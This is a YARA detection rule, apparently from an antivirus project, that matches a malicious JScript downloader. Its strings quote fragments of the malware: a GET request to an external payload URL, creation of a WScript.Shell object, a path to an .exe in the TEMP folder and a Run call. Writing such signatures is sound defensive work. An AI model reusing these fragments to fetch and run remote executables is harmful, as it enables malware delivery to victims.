rule sig_20160330_9d99cd873416713b50c6f0a1b931ff5c {
  meta:
    description = "datamaliciousorder - file 20160330_9d99cd873416713b50c6f0a1b931ff5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f3a93b7b271855aceb6bedefce11a16b0461b3d73adb4537d876b69acc60fd1"

  strings:
    $s1  = "_RK[_SH](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _OS = function _BT() {return WScript[_TO](\"WScript\"+\".Shell\");}(), _B0 = 11;" fullword ascii
    $s3  = "function _EM(_V, _H1){_H = _H * 1; return _V - _H1;};" fullword ascii
    $s4  = "if (_RK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _UT() {return _OS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"f40pz56ZMwZejMf.ex\" + \"e\";};" fullword ascii
    $s6  = "function _J(){return _F + \"\";};" fullword ascii
    $s7  = "function _O0(_LI){_OS[\"Run\"](_LI, _H, _H);};" fullword ascii
    $s8  = "function _EQ() {return ((_KI == true) && (_KI == _JS)) ? 1 : _H;};" fullword ascii
    $s9  = "function _O(){return 22;};" fullword ascii
    $s10 = "var _I = new this[\"Date\"]();" fullword ascii
    $s11 = "function _AJ(_H0) {var _CY = (1, 2, 3, 4, 5, _H0); return _CY;};" fullword ascii
    $s12 = "return _EM(_GP, _BT0);" fullword ascii
    $s13 = "function _D()" fullword ascii
    $s14 = "function _MI(){return _TO;};" fullword ascii
    $s15 = " while (_AF){" fullword ascii
    $s16 = "_KI = true; " fullword ascii
    $s17 = "_JS = true; " fullword ascii
    $s18 = "var _JS = false;" fullword ascii
    $s19 = "var _KI = false;" fullword ascii
    $s20 = "var _MB = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}